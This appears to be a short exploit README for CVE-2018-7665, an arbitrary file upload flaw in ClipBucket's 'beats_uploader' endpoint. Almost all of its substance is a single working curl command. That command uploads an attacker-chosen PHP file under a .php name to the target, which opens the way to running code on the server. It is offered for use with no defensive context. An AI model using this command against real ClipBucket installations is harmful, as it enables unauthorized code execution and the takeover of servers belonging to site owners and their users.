# ClipBucket - Arbitrary File Upload (CVE-2018-7665)
ClipBucket - 'beats_uploader' Arbitrary File Upload (Python Version) 🐍❤
--
You can exploit this vuln with Curl:
```bash
curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php" "http://$HOST/actions/beats_uploader.php"
```
